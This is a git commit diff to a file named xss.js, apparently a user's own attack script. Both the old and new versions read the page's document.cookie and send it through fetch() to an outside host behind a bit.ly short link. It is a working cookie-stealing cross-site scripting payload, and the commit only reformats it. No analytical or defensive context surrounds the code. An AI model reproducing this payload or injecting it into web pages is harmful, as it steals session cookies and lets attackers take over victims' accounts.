b69e61bcc7dbe518cd00f2ade27df72e1b7ac7ec
Douglas Rodrigues <39203535+DouglasRao@users.noreply.github.com>
2023-04-19 19:18:40 -0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,13 +1,15 @@
+let baseUrl = "https://bit.ly/3Hkv2yj";
+let queryParams = "?cookie=" + encodeURIComponent(document.cookie);
+let fullUrl = baseUrl + queryParams;
+
 let headersList = {
-    "Accept": "*/*"
+  "Accept": "*/*"
 }
-   
-let url = "https://bit.ly/3Hkv2yj?cookie=" + document.cookie;
-   
-let response = await fetch(url, {
-    method: "GET",
-    headers: headersList
+
+let response = await fetch(fullUrl, {
+  method: "GET",
+  headers: headersList
 });
-   
+
 let data = await response.text();
 console.log(data);
